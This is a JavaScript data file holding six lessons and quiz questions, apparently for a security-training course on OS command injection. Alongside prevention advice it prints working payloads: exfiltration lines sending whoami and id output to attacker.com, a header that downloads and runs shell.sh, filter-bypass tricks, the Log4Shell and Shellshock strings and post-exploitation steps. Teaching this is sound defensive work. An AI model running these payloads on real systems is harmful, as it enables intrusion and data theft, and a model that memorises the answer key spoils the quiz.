const LESSONS = [
  {
    title: "What is Command Injection?",
    points: 10,
    content: `Command Injection (OS Command Injection) lets an attacker execute arbitrary system commands on the server — often leading to full server compromise.

HOW IT HAPPENS:
Applications pass user input to the OS shell without sanitization:
  Python:  os.system("ping " + user_input)
           subprocess.run("nmap " + user_input, shell=True)
  PHP:     system("whois " + $_GET['domain'])
           exec("ping " + $_POST['ip'])
  Node.js: exec("nslookup " + hostname, callback)

EXAMPLE — A PING UTILITY:
  URL: http://site.com/ping?ip=8.8.8.8
  Server runs: ping -c 4 8.8.8.8

  Attacker injects:
  http://site.com/ping?ip=8.8.8.8; whoami
  Server now runs: ping -c 4 8.8.8.8; whoami
  Output includes result of whoami (e.g., "www-data")

SHELL OPERATORS FOR COMMAND CHAINING:
  ;           Semicolon — always runs next command
  &&          AND — runs next command only if first succeeds
  ||          OR  — runs next command only if first fails
  |           Pipe — sends output of first to second
  $()         Command substitution (runs inline)
  \`cmd\`       Backtick substitution (old-style)
  \n or %0a   Newline — starts a new command in many contexts

QUICK DETECTION PAYLOADS:
  ; sleep 5       (5 second delay = vulnerable)
  && sleep 5
  | sleep 5
  \`sleep 5\`
  $(sleep 5)

If the response takes 5 seconds longer than normal, command injection is confirmed.`,
    questions: [
      { q: "What shell operator chains commands and runs the next command regardless of success?", a: ";" },
      { q: "What shell operator runs the next command ONLY if the first command succeeds?", a: "&&" },
      { q: "In Python, what function with shell=True is commonly vulnerable to command injection?", a: "subprocess.run()" },
      { q: "What command substitution syntax embeds a command's output into another command?", a: "$()" },
      { q: "What simple time-delay injection is used to confirm command injection vulnerability?", a: "; sleep 5 (or && sleep 5, | sleep 5)" }
    ]
  },
  {
    title: "Blind Command Injection",
    points: 10,
    content: `Blind Command Injection — the command runs on the server but you cannot see the output directly in the HTTP response.

BLIND INJECTION DETECTION:

1. TIME-BASED DETECTION (Most reliable):
   Linux:   ; sleep 5
   Windows: & ping -n 5 127.0.0.1
            | timeout 5
   If response takes 5 extra seconds, injection is confirmed.

2. OUT-OF-BAND (OOB) EXFILTRATION:
   HTTP exfiltration (using curl):
     ; curl "http://attacker.com/$(whoami)"
     ; wget "http://attacker.com/?data=$(id)"

   DNS exfiltration (using nslookup):
     ; nslookup $(whoami).attacker.com
     ; nslookup \`cat /etc/hostname\`.attacker.com
   On your server: check access logs or DNS records.

3. FILE WRITE EXFILTRATION:
   Write output to a web-accessible file, then visit it:
     ; whoami > /var/www/html/output.txt
     ; cat /etc/passwd > /var/www/html/dump.txt
   Then: http://site.com/output.txt

4. PAYLOAD ENCODING (bypass filters):
   If ; is blocked:   %3b (URL-encoded ;)
   If & is blocked:   %26 (URL-encoded &)
   If | is blocked:   %7c (URL-encoded |)
   Space bypass:      $IFS (Internal Field Separator in bash)
   Brace expansion:   {cat,/etc/passwd} (no spaces needed)

PREVENTION:
  - Never pass user input to shell commands — use APIs/libraries instead
  - If unavoidable: strictly validate input with a whitelist
  - Use parameterized process calls: subprocess.run(['ping', ip]) NOT shell=True
  - Apply principle of least privilege to the web server process`,
    questions: [
      { q: "What technique uses a sleep command to confirm blind command injection?", a: "Time-based detection" },
      { q: "What DNS-based technique sends command output to an attacker's server as a subdomain?", a: "DNS exfiltration" },
      { q: "What command on Linux shows your current username?", a: "whoami" },
      { q: "What prevention technique passes arguments as a list instead of a shell string (Python)?", a: "subprocess.run(['cmd', 'arg']) — avoiding shell=True" },
      { q: "What special bash variable can replace spaces in payloads to bypass space filters?", a: "$IFS" }
    ]
  },
  {
    title: "Command Injection Tools & Defense",
    points: 10,
    content: `Professional penetration testers use specific tools to find and exploit command injection, and defenders need layered controls to prevent them.

TESTING TOOLS:

Commix (Automated Command Injection):
  The most popular dedicated command injection tool.
  Automatically detects and exploits all types.
  Example: commix --url="http://site.com/ping?ip=INJECT_HERE"
  Supports: GET, POST, cookie-based, header-based injection.

Burp Suite:
  - Repeater: manually test payloads
  - Intruder: automate with a command injection wordlist
  - Scanner: detect some command injection flaws

COMMAND INJECTION CONTEXT MATTERS:
  UNIX shell:     ; cat /etc/passwd
  Windows CMD:    & type C:\\Windows\\win.ini
  PowerShell:     ; Get-Content C:\\flag.txt

POST-EXPLOITATION COMMANDS (after RCE is confirmed):
  whoami           → Current user
  id               → User and group IDs
  uname -a         → OS version and kernel (Linux)
  ifconfig/ip addr → Network interfaces
  ls -la /         → Root directory listing
  cat /etc/passwd  → User accounts
  env              → Environment variables (secrets!)
  ps aux           → Running processes

DEFENSE IN DEPTH:

1. Avoid shell calls — use library functions:
   Instead of: exec("nslookup " + domain)
   Use:        dns.resolve(domain)  ← no shell involved

2. Input Whitelist:
   Only allow: ^[a-zA-Z0-9.\\-]+$
   Reject any input with ; & | \` $ ( ) < > \\ characters

3. Escape input (last resort):
   Python: shlex.quote(user_input)
   PHP:    escapeshellarg($input)

4. Drop privileges:
   Run the web server as a dedicated low-privilege user (not root!)
   Use chroot jails or containers to isolate the process`,
    questions: [
      { q: "What dedicated automated tool detects and exploits all types of command injection?", a: "Commix" },
      { q: "What Python function safely escapes a string for use in a shell command?", a: "shlex.quote()" },
      { q: "What PHP function escapes a string for use as a single shell argument?", a: "escapeshellarg()" },
      { q: "What is the most effective way to prevent command injection — avoiding shell calls entirely?", a: "Use library/API functions instead of shell commands (e.g., dns.resolve() instead of nslookup)" },
      { q: "What post-exploitation command reveals environment variables that may contain secrets?", a: "env" }
    ]
  },
  {
    title: "Advanced Payloads & WAF Bypass",
    points: 10,
    content: `When basic payloads are blocked by filters or WAFs, attackers use encoding tricks and alternative syntax to bypass them.

SPACE BYPASS TECHNIQUES:
  Standard:   ; cat /etc/passwd
  $IFS:       ;cat${IFS}/etc/passwd
  Brace:      {cat,/etc/passwd}
  Tab (%09):  ;cat%09/etc/passwd
  Redirect:   ;cat</etc/passwd

SPECIAL CHARACTER BYPASS:
  Variable tricks (bash):
    $() or backticks can hide commands in parameters:
      ip=8.8.8.8;$(id)
    Concatenation bypass:
      c$()at /etc/passwd   ($ expands to empty, making "cat")
      c""at /etc/passwd    (empty string in quotes)

  Wildcards:
    /etc/p?sswd     (? matches any single char)
    /etc/pas*d      (* matches any sequence)
    /???/????d      (purely wildcard-based path)

ENCODING BYPASS:
  Base64 encoding (bash):
    ; echo "d2hvYW1p" | base64 -d | bash
    (d2hvYW1p = "whoami" in base64)
  Hex encoding:
    ; printf "\x77\x68\x6f\x61\x6d\x69" | bash
    (hex for "whoami")

COMMAND INJECTION IN DIFFERENT INJECTION POINTS:
  HTTP Headers (often logged, sometimes executed):
    User-Agent: ;wget http://attacker.com/shell.sh;bash shell.sh
    X-Forwarded-For: 127.0.0.1; id
  Cookie Values:
    Cookie: user=admin; id #
  JSON body:
    {"ip": "8.8.8.8; id"}
  XML body:
    <ip>8.8.8.8; id</ip>

WINDOWS-SPECIFIC PAYLOADS:
  & whoami
  | whoami
  ; whoami (PowerShell only)
  %COMSPEC% /c whoami
  cmd.exe /c whoami
  powershell -c whoami`,
    questions: [
      { q: "What bash variable replaces a space character in command injection payloads to bypass space filters?", a: "$IFS" },
      { q: "How can you use base64 encoding to hide a command injection payload in bash?", a: "echo 'base64string' | base64 -d | bash" },
      { q: "What wildcard character matches exactly one character in a file path?", a: "? (question mark)" },
      { q: "What Windows command interpreter variable can be used to launch cmd.exe in a command injection payload?", a: "%COMSPEC%" },
      { q: "What bash trick uses an empty variable inside a command name to bypass keyword filters?", a: "c$()at (dollar sign with empty subshell makes the word 'cat')" }
    ]
  },
  {
    title: "Real-World Command Injection Cases",
    points: 10,
    content: `Real-world command injection vulnerabilities have led to some of the most severe breaches in cybersecurity history.

NOTABLE CVEs & INCIDENTS:

1. SHELLSHOCK (CVE-2014-6271) — Bash:
   A flaw in how Bash processes environment variables.
   Sending a crafted HTTP request could execute commands via CGI scripts:
     curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" http://victim.com/cgi-bin/test.cgi
   Impact: Millions of servers vulnerable. CVSS Score: 10.0 (Critical).
   Affected: Apache CGI, DHCP clients, OpenSSH ForceCommand.

2. LOG4SHELL (CVE-2021-44228) — Java Log4j:
   Not traditional OS command injection, but injection via JNDI lookup:
     ${jndi:ldap://attacker.com/exploit}
   When logged by Log4j, it fetches and executes a remote Java class.
   Impact: Affected virtually every enterprise Java application.
   CVSS Score: 10.0. One of the worst vulnerabilities ever discovered.

3. STRUTS2 (CVE-2017-5638) — Apache Struts:
   OGNL injection in the Content-Type header led to RCE.
   Used in the Equifax breach (143 million records stolen, 2017).

4. GITBLEED / GITPASTE-12 (2020):
   A worm exploiting command injection vulnerabilities in misconfigured
   Git repositories and Docker APIs exposed to the internet.

5. IOT COMMAND INJECTION (ongoing):
   Routers and IoT devices frequently have command injection in:
   - Ping utilities
   - DNS configuration forms
   - Network diagnostic pages
   These power large botnets (e.g., Mirai variants).

POST-EXPLOITATION PILLARS:
  1. Persistence: add cron jobs, SSH keys, backdoor users
  2. Lateral movement: pivot to internal network via the server
  3. Data exfiltration: steal databases, config files, secrets
  4. Privilege escalation: exploit SUID binaries, kernel exploits`,
    questions: [
      { q: "What CVE number identified the critical Bash vulnerability known as 'Shellshock'?", a: "CVE-2014-6271" },
      { q: "What Java logging library had CVE-2021-44228 (Log4Shell), a critical injection vulnerability?", a: "Log4j" },
      { q: "What major 2017 data breach exploited a command injection flaw in Apache Struts?", a: "Equifax breach" },
      { q: "What JNDI-based payload was used in the Log4Shell vulnerability?", a: "${jndi:ldap://attacker.com/exploit}" },
      { q: "What type of devices commonly run command injection vulnerabilities in their network diagnostic pages?", a: "Routers and IoT devices" }
    ]
  },
  {
    title: "Secure Implementation & Code Review",
    points: 10,
    content: `The ultimate defense against command injection is to never call the OS shell with user input. Here is how to achieve this in every major language.

PYTHON — NEVER USE shell=True WITH USER INPUT:
  # VULNERABLE:
  os.system("ping " + user_ip)
  subprocess.run("nmap " + target, shell=True)

  # SAFE — use list of arguments (no shell spawned):
  import subprocess, shlex
  result = subprocess.run(["ping", "-c", "4", user_ip], capture_output=True, text=True, timeout=10)

  # SAFE — use dedicated library:
  import socket
  ip = socket.gethostbyname(domain)  # DNS lookup without shell

PHP — AVOID exec/system WITH USER INPUT:
  # VULNERABLE:
  $output = shell_exec("whois " . $_GET['domain']);

  # SAFE — use escapeshellarg (last resort for legacy code):
  $safe = escapeshellarg($_GET['domain']);
  $output = shell_exec("whois " . $safe);

  # BETTER — use PHP library:
  // Use PHP's native network functions instead of calling CLI tools

NODE.JS:
  # VULNERABLE:
  exec("ls " + req.query.path, callback);

  # SAFE — use list form:
  const { execFile } = require("child_process");
  execFile("ls", [req.query.path], callback);  // No shell spawned

  # EVEN BETTER:
  const fs = require("fs");
  fs.readdir(safePath, callback);  // No OS command at all

CODE REVIEW CHECKLIST:
  ✔ Search for: exec, system, popen, spawn, shell=True, backticks
  ✔ Trace every variable reaching those calls back to user input
  ✔ Verify all user input is validated with a strict whitelist
  ✔ Confirm input is never concatenated into OS command strings
  ✔ Check all HTTP headers, cookies, and body params — not just URL
  ✔ Review CI/CD pipelines for injected build commands

STATIC ANALYSIS TOOLS:
  Bandit (Python):  bandit -r . -t B602,B603,B605
  Semgrep:          semgrep --config=p/command-injection
  SonarQube:        built-in command injection detection rules`,
    questions: [
      { q: "In Python, what safe alternative to shell=True passes arguments as a list to subprocess.run()?", a: "subprocess.run(['cmd', 'arg1', 'arg2'], ...) — a list, not a string" },
      { q: "In Node.js, what function runs a process without spawning a shell, making command injection impossible?", a: "execFile()" },
      { q: "What Python static analysis tool detects dangerous calls like subprocess with shell=True?", a: "Bandit" },
      { q: "What Semgrep config pack scans code specifically for command injection patterns?", a: "p/command-injection" },
      { q: "What PHP function should be used as a last resort to safely escape user input for shell arguments?", a: "escapeshellarg()" }
    ]
  }
];
